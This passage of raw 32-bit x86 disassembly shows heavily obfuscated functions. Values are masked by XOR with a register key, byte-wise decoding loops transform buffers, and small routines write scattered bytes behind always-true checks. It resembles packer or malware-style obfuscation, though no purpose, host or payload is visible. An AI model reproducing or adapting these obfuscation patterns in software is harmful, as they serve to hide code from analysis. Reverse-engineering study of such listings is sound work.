  42099b:	mov    ecx,DWORD PTR [ebp-0x48]
  42099e:	xor    eax,ebx
  4209a0:	add    eax,esi
  4209a2:	imul   eax,ecx
  4209a5:	mov    ecx,DWORD PTR [ebp-0x8]
  4209a8:	mov    al,BYTE PTR [eax+ecx*1]
  4209ab:	mov    BYTE PTR [ebp-0x2],al
  4209ae:	mov    eax,DWORD PTR [ebp-0x1c]
  4209b1:	mov    ecx,DWORD PTR [ebp-0x48]
  4209b4:	xor    eax,ebx
  4209b6:	add    eax,esi
  4209b8:	imul   eax,ecx
  4209bb:	mov    ecx,DWORD PTR [ebp-0xe8]
  4209c1:	xor    ecx,ebx
  4209c3:	add    eax,ecx
  4209c5:	mov    ecx,DWORD PTR [ebp-0x8]
  4209c8:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  4209d0:	mov    ecx,DWORD PTR [ebp-0xe0]
  4209d6:	xor    ecx,ebx
  4209d8:	lea    eax,[ecx+eax*1+0x3272fa]
  4209df:	movzx  ecx,BYTE PTR [ebp-0x2]
  4209e3:	xor    ecx,eax
  4209e5:	mov    BYTE PTR [ebp-0x2],cl
  4209e8:	mov    al,BYTE PTR [ebp-0x2]
  4209eb:	mov    ecx,DWORD PTR [ebp-0x1c]
  4209ee:	mov    edx,DWORD PTR [ebp-0x48]
  4209f1:	xor    ecx,ebx
  4209f3:	add    ecx,esi
  4209f5:	imul   ecx,edx
  4209f8:	mov    edx,DWORD PTR [ebp-0x8]
  4209fb:	mov    BYTE PTR [ecx+edx*1],al
  4209fe:	mov    eax,DWORD PTR [ebp-0x1c]
  420a01:	mov    ecx,DWORD PTR [ebp-0x48]
  420a04:	xor    eax,ebx
  420a06:	add    eax,esi
  420a08:	imul   eax,ecx
  420a0b:	mov    ecx,DWORD PTR [ebp-0x8]
  420a0e:	mov    al,BYTE PTR [eax+ecx*1]
  420a11:	mov    BYTE PTR [ebp-0x2],al
  420a14:	mov    eax,DWORD PTR [ebp-0x1c]
  420a17:	mov    ecx,DWORD PTR [ebp-0x48]
  420a1a:	xor    eax,ebx
  420a1c:	add    eax,esi
  420a1e:	imul   eax,ecx
  420a21:	mov    ecx,DWORD PTR [ebp-0x20]
  420a24:	xor    ecx,ebx
  420a26:	add    eax,ecx
  420a28:	mov    ecx,DWORD PTR [ebp-0x8]
  420a2b:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420a33:	mov    ecx,DWORD PTR [ebp-0xc4]
  420a39:	xor    ecx,ebx
  420a3b:	lea    eax,[ecx+eax*1+0x3272fa]
  420a42:	movzx  ecx,BYTE PTR [ebp-0x2]
  420a46:	xor    ecx,eax
  420a48:	mov    BYTE PTR [ebp-0x2],cl
  420a4b:	mov    al,BYTE PTR [ebp-0x2]
  420a4e:	mov    ecx,DWORD PTR [ebp-0x1c]
  420a51:	mov    edx,DWORD PTR [ebp-0x48]
  420a54:	xor    ecx,ebx
  420a56:	add    ecx,esi
  420a58:	imul   ecx,edx
  420a5b:	mov    edx,DWORD PTR [ebp-0x8]
  420a5e:	mov    BYTE PTR [ecx+edx*1],al
  420a61:	mov    eax,DWORD PTR [ebp-0x38]
  420a64:	mov    ecx,DWORD PTR [ebp-0x20]
  420a67:	xor    eax,ebx
  420a69:	xor    ecx,ebx
  420a6b:	add    eax,esi
  420a6d:	add    ecx,esi
  420a6f:	imul   eax,ecx
  420a72:	add    eax,DWORD PTR [ebp-0x48]
  420a75:	mov    DWORD PTR [ebp-0x48],eax
  420a78:	mov    eax,DWORD PTR [ebp-0x48]
  420a7b:	mov    ecx,DWORD PTR [ebp-0x14]
  420a7e:	cmp    ecx,eax
  420a80:	jb     0x420984
  420a86:	mov    eax,DWORD PTR [ebp-0x20]
  420a89:	mov    ecx,DWORD PTR [ebp-0x14]
  420a8c:	xor    eax,ebx
  420a8e:	add    eax,esi
  420a90:	imul   eax,ecx
  420a93:	mov    ecx,DWORD PTR [ebp-0x24]
  420a96:	xor    ecx,ebx
  420a98:	add    ecx,esi
  420a9a:	or     eax,ecx
  420a9c:	mov    ecx,DWORD PTR [ebp-0x30]
  420a9f:	xor    ecx,ebx
  420aa1:	add    eax,ecx
  420aa3:	mov    ecx,DWORD PTR [ebp-0x30]
  420aa6:	xor    ecx,ebx
  420aa8:	add    eax,ecx
  420aaa:	mov    ecx,DWORD PTR [ebp-0xc]
  420aad:	lea    eax,[eax+ecx*1+0x64e5f4]
  420ab4:	jmp    0x420ac5
  420ab6:	mov    eax,DWORD PTR [ebp-0x30]
  420ab9:	mov    ecx,DWORD PTR [ebp-0xc]
  420abc:	xor    eax,ebx
  420abe:	lea    eax,[eax+ecx*1+0x3272fa]
  420ac5:	mov    DWORD PTR [ebp-0xc],eax
  420ac8:	mov    eax,DWORD PTR [ebp-0x30]
  420acb:	xor    eax,ebx
  420acd:	mov    ecx,0xffcd8d06
  420ad2:	sub    ecx,eax
  420ad4:	add    ecx,DWORD PTR [ebp-0x28]
  420ad7:	mov    eax,DWORD PTR [ebp-0x30]
  420ada:	mov    edx,DWORD PTR [ebp-0xc]
  420add:	xor    eax,ebx
  420adf:	add    eax,esi
  420ae1:	imul   eax,edx
  420ae4:	cmp    eax,ecx
  420ae6:	jbe    0x4208f8
  420aec:	mov    eax,DWORD PTR [ebp-0x10]
  420aef:	mov    ecx,DWORD PTR [ebp-0x3c]
  420af2:	mov    eax,DWORD PTR [ebp+0x8]
  420af5:	mov    edx,DWORD PTR [ebp-0x54]
  420af8:	mov    eax,DWORD PTR [eax+0x1e0]
  420afe:	xor    edx,ebx
  420b00:	add    edx,esi
  420b02:	push   edx
  420b03:	mov    edx,DWORD PTR [ebp-0x40]
  420b06:	xor    edx,ebx
  420b08:	add    edx,esi
  420b0a:	push   edx
  420b0b:	push   ecx
  420b0c:	mov    DWORD PTR [ebp-0x38],ecx
  420b0f:	mov    ecx,DWORD PTR [ebp-0x10]
  420b12:	xor    ecx,ebx
  420b14:	add    ecx,esi
  420b16:	push   ecx
  420b17:	call   DWORD PTR [eax+0x14]
  420b1a:	mov    edi,eax
  420b1c:	mov    eax,DWORD PTR [ebp-0x10]
  420b1f:	xor    eax,ebx
  420b21:	add    eax,esi
  420b23:	cmp    eax,edi
  420b25:	je     0x420b80
  420b27:	mov    eax,DWORD PTR [ebp-0x10]
  420b2a:	jmp    0x420b4d
  420b2c:	mov    ecx,DWORD PTR [ebp-0x2c]
  420b2f:	xor    eax,ebx
  420b31:	mov    cl,BYTE PTR [ecx+eax*1+0x3272fa]
  420b38:	mov    BYTE PTR [eax+edi*1+0x3272fa],cl
  420b3f:	mov    ecx,DWORD PTR [ebp-0x18]
  420b42:	xor    ecx,ebx
  420b44:	lea    eax,[ecx+eax*1+0x3272fa]
  420b4b:	xor    eax,ebx
  420b4d:	mov    ecx,DWORD PTR [ebp-0x3c]
  420b50:	sub    ecx,esi
  420b52:	xor    ecx,ebx
  420b54:	cmp    eax,ecx
  420b56:	jne    0x420b2c
  420b58:	mov    eax,DWORD PTR [ebp+0x8]
  420b5b:	mov    ecx,DWORD PTR [ebp-0x50]
  420b5e:	mov    eax,DWORD PTR [eax+0x1e0]
  420b64:	xor    ecx,ebx
  420b66:	add    ecx,esi
  420b68:	push   ecx
  420b69:	mov    ecx,DWORD PTR [ebp-0x10]
  420b6c:	xor    ecx,ebx
  420b6e:	add    ecx,esi
  420b70:	push   ecx
  420b71:	push   DWORD PTR [ebp-0x2c]
  420b74:	call   DWORD PTR [eax+0x18]
  420b77:	mov    eax,DWORD PTR [ebp-0x38]
  420b7a:	mov    DWORD PTR [ebp-0x2c],edi
  420b7d:	mov    DWORD PTR [ebp-0x3c],eax
  420b80:	mov    eax,DWORD PTR [ebp-0x2c]
  420b83:	mov    DWORD PTR [ebp-0x14],eax
  420b86:	mov    eax,DWORD PTR [ebp-0x18]
  420b89:	mov    ecx,DWORD PTR [ebp-0x10]
  420b8c:	xor    eax,ebx
  420b8e:	add    eax,esi
  420b90:	mov    DWORD PTR [ebp-0x5c],0xbad3cbd3
  420b97:	mov    DWORD PTR [ebp-0x58],0xc4d3bcd3
  420b9e:	jmp    0x420bd1
  420ba0:	mov    edx,DWORD PTR [ebp-0x14]
  420ba3:	mov    edi,ecx
  420ba5:	xor    edi,ebx
  420ba7:	mov    cl,BYTE PTR [ebp+edi*1+0x32729e]
  420bae:	movsx  edx,BYTE PTR [edi+edx*1+0x3272fa]
  420bb6:	xor    cl,0x81
  420bb9:	add    cl,0x6
  420bbc:	movzx  ecx,cl
  420bbf:	cmp    edx,ecx
  420bc1:	jne    0x420bdb
  420bc3:	mov    ecx,DWORD PTR [ebp-0x18]
  420bc6:	xor    ecx,ebx
  420bc8:	lea    ecx,[ecx+edi*1+0x3272fa]
  420bcf:	xor    ecx,ebx
  420bd1:	cmp    ecx,0xf89c85bd
  420bd7:	jne    0x420ba0
  420bd9:	jmp    0x420be2
  420bdb:	mov    eax,DWORD PTR [ebp-0x10]
  420bde:	xor    eax,ebx
  420be0:	add    eax,esi
  420be2:	mov    ecx,DWORD PTR [ebp-0x10]
  420be5:	xor    ecx,ebx
  420be7:	add    ecx,esi
  420be9:	cmp    ecx,eax
  420beb:	je     0x420d61
  420bf1:	mov    eax,DWORD PTR [ebp-0x14]
  420bf4:	mov    eax,DWORD PTR [eax+0x8]
  420bf7:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
  420bfe:	mov    DWORD PTR [ebp-0x40],0xf89cc3c6
  420c05:	mov    DWORD PTR [ebp-0x44],0xf89cb5b5
  420c0c:	mov    DWORD PTR [ebp-0x24],0xf89c85b9
  420c13:	mov    DWORD PTR [ebp-0x20],eax
  420c16:	mov    eax,DWORD PTR [ebp+0x8]
  420c19:	mov    ecx,DWORD PTR [ebp-0x24]
  420c1c:	xor    ecx,ebx
  420c1e:	add    ecx,esi
  420c20:	push   ecx
  420c21:	mov    ecx,DWORD PTR [ebp-0x44]
  420c24:	mov    eax,DWORD PTR [eax+0x1e0]
  420c2a:	xor    ecx,ebx
  420c2c:	add    ecx,esi
  420c2e:	push   ecx
  420c2f:	mov    ecx,DWORD PTR [ebp-0x40]
  420c32:	xor    ecx,ebx
  420c34:	add    ecx,esi
  420c36:	push   ecx
  420c37:	mov    ecx,DWORD PTR [ebp-0xc]
  420c3a:	xor    ecx,ebx
  420c3c:	add    ecx,esi
  420c3e:	push   ecx
  420c3f:	call   DWORD PTR [eax+0x14]
  420c42:	mov    edi,eax
  420c44:	mov    eax,DWORD PTR [ebp+0x8]
  420c47:	mov    ecx,DWORD PTR [ebp-0x24]
  420c4a:	mov    eax,DWORD PTR [eax+0x1e0]
  420c50:	xor    ecx,ebx
  420c52:	add    ecx,esi
  420c54:	push   ecx
  420c55:	mov    ecx,DWORD PTR [ebp-0x44]
  420c58:	xor    ecx,ebx
  420c5a:	add    ecx,esi
  420c5c:	push   ecx
  420c5d:	mov    ecx,DWORD PTR [ebp-0xc]
  420c60:	push   DWORD PTR [ebp-0x20]
  420c63:	xor    ecx,ebx
  420c65:	add    ecx,esi
  420c67:	push   ecx
  420c68:	call   DWORD PTR [eax+0x14]
  420c6b:	mov    ecx,DWORD PTR [ebp-0xc]
  420c6e:	xor    ecx,ebx
  420c70:	add    ecx,esi
  420c72:	mov    DWORD PTR [ebp-0x24],eax
  420c75:	cmp    ecx,edi
  420c77:	je     0x421004
  420c7d:	mov    ecx,DWORD PTR [ebp-0xc]
  420c80:	xor    ecx,ebx
  420c82:	add    ecx,esi
  420c84:	cmp    ecx,eax
  420c86:	je     0x421004
  420c8c:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  420c93:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  420c9a:	mov    ecx,DWORD PTR [ebp-0x40]
  420c9d:	xor    cl,0xb3
  420ca0:	sub    cl,0x6
  420ca3:	mov    BYTE PTR [edi],cl
  420ca5:	mov    ecx,DWORD PTR [ebp-0xc]
  420ca8:	xor    cl,0xb3
  420cab:	sub    cl,0x6
  420cae:	mov    BYTE PTR [edi+0x1],cl
  420cb1:	mov    ecx,DWORD PTR [ebp-0x54]
  420cb4:	xor    cl,0xb3
  420cb7:	sub    cl,0x6
  420cba:	mov    BYTE PTR [edi+0x2],cl
  420cbd:	and    DWORD PTR [ebp-0xc8],0x0
  420cc4:	and    DWORD PTR [ebp-0xdc],0x0
  420ccb:	lea    ecx,[ebp-0xdc]
  420cd1:	push   ecx
  420cd2:	push   DWORD PTR [ebp-0x20]
  420cd5:	push   eax
  420cd6:	lea    eax,[ebp-0xc8]
  420cdc:	push   eax
  420cdd:	mov    eax,DWORD PTR [ebp-0x14]
  420ce0:	push   DWORD PTR [eax+0xc]
  420ce3:	mov    eax,DWORD PTR [ebp-0x2c]
  420ce6:	add    eax,0x10
  420ce9:	push   eax
  420cea:	push   edi
  420ceb:	call   0x41ff8f
  420cf0:	mov    DWORD PTR [ebp-0x40],eax
  420cf3:	mov    eax,DWORD PTR [ebp+0x8]
  420cf6:	mov    ecx,DWORD PTR [ebp-0x50]
  420cf9:	mov    eax,DWORD PTR [eax+0x1e0]
  420cff:	xor    ecx,ebx
  420d01:	add    ecx,esi
  420d03:	push   ecx
  420d04:	mov    ecx,DWORD PTR [ebp-0xc]
  420d07:	xor    ecx,ebx
  420d09:	add    ecx,esi
  420d0b:	push   ecx
  420d0c:	push   edi
  420d0d:	call   DWORD PTR [eax+0x18]
  420d10:	mov    eax,DWORD PTR [ebp-0x40]
  420d13:	add    eax,0xffcd8d06
  420d18:	xor    eax,ebx
  420d1a:	cmp    eax,0xf89c85b5
  420d1f:	mov    eax,DWORD PTR [ebp+0x8]
  420d22:	mov    eax,DWORD PTR [eax+0x1e0]
  420d28:	mov    ecx,DWORD PTR [ebp-0x50]
  420d2b:	jne    0x420d4e
  420d2d:	xor    ecx,ebx
  420d2f:	add    ecx,esi
  420d31:	push   ecx
  420d32:	mov    ecx,DWORD PTR [ebp-0xc]
  420d35:	xor    ecx,ebx
  420d37:	add    ecx,esi
  420d39:	push   ecx
  420d3a:	push   DWORD PTR [ebp-0x2c]
  420d3d:	call   DWORD PTR [eax+0x18]
  420d40:	mov    eax,DWORD PTR [ebp-0x24]
  420d43:	mov    DWORD PTR [ebp-0x2c],eax
  420d46:	mov    eax,DWORD PTR [ebp-0x20]
  420d49:	mov    DWORD PTR [ebp-0x3c],eax
  420d4c:	jmp    0x420d61
  420d4e:	xor    ecx,ebx
  420d50:	add    ecx,esi
  420d52:	push   ecx
  420d53:	mov    ecx,DWORD PTR [ebp-0xc]
  420d56:	xor    ecx,ebx
  420d58:	add    ecx,esi
  420d5a:	push   ecx
  420d5b:	push   DWORD PTR [ebp-0x24]
  420d5e:	call   DWORD PTR [eax+0x18]
  420d61:	mov    eax,DWORD PTR [ebp-0x3c]
  420d64:	mov    DWORD PTR [ebp-0x34],eax
  420d67:	mov    eax,DWORD PTR [ebp-0x2c]
  420d6a:	mov    DWORD PTR [ebp-0x28],0xf89c85b5
  420d71:	mov    DWORD PTR [ebp-0x40],eax
  420d74:	mov    edi,0xf89c85b4
  420d79:	mov    DWORD PTR [ebp-0x30],edi
  420d7c:	mov    eax,DWORD PTR [ebp-0x28]
  420d7f:	xor    eax,ebx
  420d81:	add    eax,esi
  420d83:	mov    DWORD PTR [ebp-0xc],eax
  420d86:	mov    eax,DWORD PTR [ebp-0x28]
  420d89:	xor    eax,ebx
  420d8b:	add    eax,esi
  420d8d:	mov    DWORD PTR [ebp-0x14],eax
  420d90:	mov    DWORD PTR [ebp-0x44],0xf89c8595
  420d97:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  420d9e:	mov    eax,DWORD PTR [ebp-0x28]
  420da1:	mov    ecx,DWORD PTR [ebp-0x34]
  420da4:	xor    eax,ebx
  420da6:	add    eax,esi
  420da8:	cmp    ecx,eax
  420daa:	je     0x420fa0
  420db0:	jmp    0x420f7c
  420db5:	mov    ecx,DWORD PTR [ebp-0xc]
  420db8:	mov    eax,DWORD PTR [ebp-0x34]
  420dbb:	sub    eax,ecx
  420dbd:	mov    ecx,DWORD PTR [ebp-0x44]
  420dc0:	xor    ecx,ebx
  420dc2:	add    ecx,esi
  420dc4:	xor    edx,edx
  420dc6:	div    ecx
  420dc8:	mov    DWORD PTR [ebp-0x14],eax
  420dcb:	mov    eax,DWORD PTR [ebp-0x24]
  420dce:	mov    ecx,DWORD PTR [ebp-0x14]
  420dd1:	xor    eax,ebx
  420dd3:	add    eax,esi
  420dd5:	cmp    ecx,eax
  420dd7:	jbe    0x420de3
  420dd9:	mov    eax,DWORD PTR [ebp-0x24]
  420ddc:	xor    eax,ebx
  420dde:	add    eax,esi
  420de0:	mov    DWORD PTR [ebp-0x14],eax
  420de3:	mov    eax,DWORD PTR [ebp-0x44]
  420de6:	mov    ecx,DWORD PTR [ebp-0x14]
  420de9:	xor    eax,ebx
  420deb:	add    eax,esi
  420ded:	imul   eax,ecx
  420df0:	mov    DWORD PTR [ebp-0x14],eax
  420df3:	mov    eax,DWORD PTR [ebp-0x28]
  420df6:	mov    ecx,DWORD PTR [ebp-0x14]
  420df9:	xor    eax,ebx
  420dfb:	add    eax,esi
  420dfd:	cmp    ecx,eax
  420dff:	je     0x420f6a
  420e05:	mov    eax,DWORD PTR [ebp-0x14]
  420e08:	mov    DWORD PTR [ebp-0x20],eax
  420e0b:	mov    eax,DWORD PTR [ebp-0xc]
  420e0e:	add    eax,DWORD PTR [ebp-0x40]
  420e11:	mov    DWORD PTR [ebp-0x4c],0xf89c85b5
  420e18:	mov    DWORD PTR [ebp-0x14],edi
  420e1b:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  420e22:	mov    DWORD PTR [ebp-0x1c],eax
  420e25:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  420e2c:	mov    DWORD PTR [ebp-0x8],edi
  420e2f:	mov    eax,DWORD PTR [ebp-0x4c]
  420e32:	xor    eax,ebx
  420e34:	add    eax,esi
  420e36:	jmp    0x420f29
  420e3b:	mov    DWORD PTR [ebp-0xe4],0xf89c85a2
  420e45:	mov    DWORD PTR [ebp-0xd0],0xf89c85af
  420e4f:	mov    eax,DWORD PTR [ebp-0x8]
  420e52:	mov    ecx,DWORD PTR [ebp-0x18]
  420e55:	xor    eax,ebx
  420e57:	add    eax,esi
  420e59:	imul   eax,ecx
  420e5c:	mov    ecx,DWORD PTR [ebp-0x1c]
  420e5f:	mov    al,BYTE PTR [eax+ecx*1]
  420e62:	mov    BYTE PTR [ebp-0x1],al
  420e65:	mov    eax,DWORD PTR [ebp-0x8]
  420e68:	mov    ecx,DWORD PTR [ebp-0x18]
  420e6b:	xor    eax,ebx
  420e6d:	add    eax,esi
  420e6f:	imul   eax,ecx
  420e72:	mov    ecx,DWORD PTR [ebp-0x54]
  420e75:	xor    ecx,ebx
  420e77:	add    eax,ecx
  420e79:	mov    ecx,DWORD PTR [ebp-0x1c]
  420e7c:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420e84:	mov    ecx,DWORD PTR [ebp-0xe4]
  420e8a:	xor    ecx,ebx
  420e8c:	lea    eax,[ecx+eax*1+0x3272fa]
  420e93:	movzx  ecx,BYTE PTR [ebp-0x1]
  420e97:	xor    ecx,eax
  420e99:	mov    BYTE PTR [ebp-0x1],cl
  420e9c:	mov    al,BYTE PTR [ebp-0x1]
  420e9f:	mov    ecx,DWORD PTR [ebp-0x8]
  420ea2:	mov    edx,DWORD PTR [ebp-0x18]
  420ea5:	xor    ecx,ebx
  420ea7:	add    ecx,esi
  420ea9:	imul   ecx,edx
  420eac:	mov    edx,DWORD PTR [ebp-0x1c]
  420eaf:	mov    BYTE PTR [ecx+edx*1],al
  420eb2:	mov    eax,DWORD PTR [ebp-0x8]
  420eb5:	mov    ecx,DWORD PTR [ebp-0x18]
  420eb8:	xor    eax,ebx
  420eba:	add    eax,esi
  420ebc:	imul   eax,ecx
  420ebf:	mov    ecx,DWORD PTR [ebp-0x1c]
  420ec2:	mov    al,BYTE PTR [eax+ecx*1]
  420ec5:	mov    BYTE PTR [ebp-0x1],al
  420ec8:	mov    eax,DWORD PTR [ebp-0x8]
  420ecb:	mov    ecx,DWORD PTR [ebp-0x18]
  420ece:	xor    eax,ebx
  420ed0:	add    eax,esi
  420ed2:	imul   eax,ecx
  420ed5:	mov    ecx,DWORD PTR [ebp-0x14]
  420ed8:	xor    ecx,ebx
  420eda:	add    eax,ecx
  420edc:	mov    ecx,DWORD PTR [ebp-0x1c]
  420edf:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420ee7:	mov    ecx,DWORD PTR [ebp-0xd0]
  420eed:	xor    ecx,ebx
  420eef:	lea    eax,[ecx+eax*1+0x3272fa]
  420ef6:	movzx  ecx,BYTE PTR [ebp-0x1]
  420efa:	xor    ecx,eax
  420efc:	mov    BYTE PTR [ebp-0x1],cl
  420eff:	mov    al,BYTE PTR [ebp-0x1]
  420f02:	mov    ecx,DWORD PTR [ebp-0x8]
  420f05:	mov    edx,DWORD PTR [ebp-0x18]
  420f08:	xor    ecx,ebx
  420f0a:	add    ecx,esi
  420f0c:	imul   ecx,edx
  420f0f:	mov    edx,DWORD PTR [ebp-0x1c]
  420f12:	mov    BYTE PTR [ecx+edx*1],al
  420f15:	mov    eax,DWORD PTR [ebp-0x38]
  420f18:	mov    ecx,DWORD PTR [ebp-0x14]
  420f1b:	xor    eax,ebx
  420f1d:	xor    ecx,ebx
  420f1f:	add    eax,esi
  420f21:	add    ecx,esi
  420f23:	imul   eax,ecx
  420f26:	add    eax,DWORD PTR [ebp-0x18]
  420f29:	mov    DWORD PTR [ebp-0x18],eax
  420f2c:	mov    eax,DWORD PTR [ebp-0x18]
  420f2f:	mov    ecx,DWORD PTR [ebp-0x20]
  420f32:	cmp    ecx,eax
  420f34:	jb     0x420e3b
  420f3a:	mov    eax,DWORD PTR [ebp-0x14]
  420f3d:	mov    ecx,DWORD PTR [ebp-0x20]
  420f40:	xor    eax,ebx
  420f42:	add    eax,esi
  420f44:	imul   eax,ecx
  420f47:	mov    ecx,DWORD PTR [ebp-0x4c]
  420f4a:	xor    ecx,ebx
  420f4c:	add    ecx,esi
  420f4e:	or     eax,ecx
  420f50:	mov    ecx,DWORD PTR [ebp-0x30]
  420f53:	xor    ecx,ebx
  420f55:	add    eax,ecx
  420f57:	mov    ecx,DWORD PTR [ebp-0x30]
  420f5a:	xor    ecx,ebx
  420f5c:	add    eax,ecx
  420f5e:	mov    ecx,DWORD PTR [ebp-0xc]
  420f61:	lea    eax,[eax+ecx*1+0x64e5f4]
  420f68:	jmp    0x420f79
  420f6a:	mov    eax,DWORD PTR [ebp-0x30]
  420f6d:	mov    ecx,DWORD PTR [ebp-0xc]
  420f70:	xor    eax,ebx
  420f72:	lea    eax,[eax+ecx*1+0x3272fa]
  420f79:	mov    DWORD PTR [ebp-0xc],eax
  420f7c:	mov    eax,DWORD PTR [ebp-0x30]
  420f7f:	xor    eax,ebx
  420f81:	mov    ecx,0xffcd8d06
  420f86:	sub    ecx,eax
  420f88:	add    ecx,DWORD PTR [ebp-0x34]
  420f8b:	mov    eax,DWORD PTR [ebp-0x30]
  420f8e:	mov    edx,DWORD PTR [ebp-0xc]
  420f91:	xor    eax,ebx
  420f93:	add    eax,esi
  420f95:	imul   eax,edx
  420f98:	cmp    eax,ecx
  420f9a:	jbe    0x420db5
  420fa0:	push   DWORD PTR [ebp+0x8]
  420fa3:	mov    eax,DWORD PTR [ebp+0x8]
  420fa6:	push   DWORD PTR [eax+0x1cc]
  420fac:	lea    eax,[ebp-0xd8]
  420fb2:	push   eax
  420fb3:	mov    eax,DWORD PTR [ebp+0x8]
  420fb6:	mov    eax,DWORD PTR [eax+0x1c4]
  420fbc:	push   DWORD PTR [eax]
  420fbe:	mov    eax,DWORD PTR [ebp+0x8]
  420fc1:	mov    eax,DWORD PTR [eax+0x1c0]
  420fc7:	push   DWORD PTR [eax]
  420fc9:	push   DWORD PTR [ebp-0x3c]
  420fcc:	push   DWORD PTR [ebp-0x2c]
  420fcf:	call   0x421a66
  420fd4:	mov    DWORD PTR [ebp-0x40],eax
  420fd7:	mov    eax,DWORD PTR [ebp-0x10]
  420fda:	mov    ecx,DWORD PTR [ebp-0x2c]
  420fdd:	xor    eax,ebx
  420fdf:	add    eax,esi
  420fe1:	cmp    eax,ecx
  420fe3:	je     0x421004
  420fe5:	mov    eax,DWORD PTR [ebp+0x8]
  420fe8:	mov    ecx,DWORD PTR [ebp-0x50]
  420feb:	mov    eax,DWORD PTR [eax+0x1e0]
  420ff1:	xor    ecx,ebx
  420ff3:	add    ecx,esi
  420ff5:	push   ecx
  420ff6:	mov    ecx,DWORD PTR [ebp-0x10]
  420ff9:	xor    ecx,ebx
  420ffb:	add    ecx,esi
  420ffd:	push   ecx
  420ffe:	push   DWORD PTR [ebp-0x2c]
  421001:	call   DWORD PTR [eax+0x18]
  421004:	pop    edi
  421005:	pop    esi
  421006:	pop    ebx
  421007:	leave  
  421008:	ret    0x4
  42100b:	push   ebp
  42100c:	mov    ebp,esp
  42100e:	push   ecx
  42100f:	push   ecx
  421010:	lea    eax,[ebp-0x8]
  421013:	mov    DWORD PTR [ebp-0x4],eax
  421016:	push   esi
  421017:	mov    esi,DWORD PTR [ebp-0x4]
  42101a:	mov    eax,0xf881bacf
  42101f:	mov    DWORD PTR [esi],eax
  421021:	mov    esi,DWORD PTR [ebp-0x8]
  421024:	cmp    esi,eax
  421026:	pop    esi
  421027:	jne    0x421031
  421029:	mov    BYTE PTR [ecx+0xa],0x7b
  42102d:	mov    BYTE PTR [edx+0x8],0xcc
  421031:	mov    BYTE PTR [edx+0xa],0x7b
  421035:	mov    BYTE PTR [ecx+0x2],0xe9
  421039:	leave  
  42103a:	ret    
  42103b:	push   ebp
  42103c:	mov    ebp,esp
  42103e:	push   ecx
  42103f:	push   ecx
  421040:	lea    eax,[ebp-0x8]
  421043:	mov    DWORD PTR [ebp-0x4],eax
  421046:	mov    edx,DWORD PTR [ebp-0x4]
  421049:	mov    eax,0xf88b0bd3
  42104e:	mov    DWORD PTR [edx],eax
  421050:	mov    edx,DWORD PTR [ebp-0x8]
  421053:	cmp    edx,eax
  421055:	jne    0x421066
  421057:	mov    eax,DWORD PTR [ebp+0x8]
  42105a:	mov    BYTE PTR [ecx+0x9],0xef
  42105e:	mov    BYTE PTR [eax+0x7],0xa4
  421062:	mov    BYTE PTR [ecx+0x6],0xec
  421066:	mov    BYTE PTR [ecx+0x3],0xdf
  42106a:	leave  
  42106b:	ret    0x4
  42106e:	push   ebp
  42106f:	mov    ebp,esp
  421071:	push   ecx
  421072:	push   ecx
  421073:	lea    eax,[ebp-0x8]
  421076:	mov    DWORD PTR [ebp-0x4],eax
  421079:	mov    edx,DWORD PTR [ebp-0x4]
  42107c:	mov    eax,0x7e0dacf
  421081:	mov    DWORD PTR [edx],eax
  421083:	mov    edx,DWORD PTR [ebp-0x8]
  421086:	cmp    edx,eax
  421088:	jne    0x42108e
  42108a:	mov    BYTE PTR [ecx+0x7],0xa4
  42108e:	mov    eax,DWORD PTR [ebp+0x8]
  421091:	mov    BYTE PTR [ecx+0x1],0xe2
  421095:	mov    BYTE PTR [eax+0x9],0xcf
  421099:	leave  
  42109a:	ret    0x4
  42109d:	push   ebp
  42109e:	mov    ebp,esp
  4210a0:	push   ecx
  4210a1:	push   ecx
  4210a2:	lea    eax,[ebp-0x8]
  4210a5:	mov    DWORD PTR [ebp-0x4],eax
  4210a8:	push   esi
  4210a9:	mov    esi,DWORD PTR [ebp-0x4]
  4210ac:	mov    eax,0x7060e3e
  4210b1:	mov    DWORD PTR [esi],eax
  4210b3:	mov    esi,DWORD PTR [ebp-0x8]
  4210b6:	cmp    esi,eax
  4210b8:	pop    esi
  4210b9:	jne    0x4210c5
  4210bb:	mov    BYTE PTR [edx+0x4],0xe8
  4210bf:	mov    WORD PTR [ecx+0x3],0xe8df
  4210c5:	mov    BYTE PTR [edx],0xbc
  4210c8:	leave  
  4210c9:	ret    
  4210ca:	push   ebp
  4210cb:	mov    ebp,esp
  4210cd:	push   ecx
  4210ce:	push   ecx
  4210cf:	lea    eax,[ebp-0x8]
  4210d2:	mov    DWORD PTR [ebp-0x4],eax
  4210d5:	mov    edx,DWORD PTR [ebp-0x4]
  4210d8:	mov    eax,0xf8870b3f
  4210dd:	mov    DWORD PTR [edx],eax
  4210df:	mov    edx,DWORD PTR [ebp-0x8]
  4210e2:	cmp    edx,eax
  4210e4:	jne    0x4210f1
  4210e6:	mov    eax,DWORD PTR [ebp+0x8]
  4210e9:	mov    BYTE PTR [ecx+0x8],0xec
  4210ed:	mov    BYTE PTR [eax+0x1],0xe2
  4210f1:	mov    BYTE PTR [ecx+0x5],0xf0
  4210f5:	leave  
  4210f6:	ret    0x4
  4210f9:	push   esi
  4210fa:	mov    ecx,edi
  4210fc:	call   0x4210ca
  421101:	mov    edx,edi
  421103:	mov    ecx,esi
  421105:	mov    BYTE PTR [esi],0xdc
  421108:	call   0x42109d
  42110d:	push   esi
  42110e:	mov    ecx,edi
  421110:	mov    BYTE PTR [esi+0x5],0xf0
  421114:	call   0x42106e
  421119:	push   esi
  42111a:	mov    BYTE PTR [esi+0x6],0xec
  42111e:	call   0x42103b
  421123:	mov    BYTE PTR [esi+0x2],0xe9
  421127:	mov    edx,esi
  421129:	jmp    0x42100b
  42112e:	push   ebp
  42112f:	mov    ebp,esp
  421131:	push   ecx
  421132:	mov    ecx,DWORD PTR [edx+0x194]
  421138:	push   esi
  421139:	mov    esi,DWORD PTR [ebp+0x8]
  42113c:	mov    esi,DWORD PTR [esi]
  42113e:	mov    DWORD PTR [ecx],esi
  421140:	mov    ecx,DWORD PTR [edx+0x194]
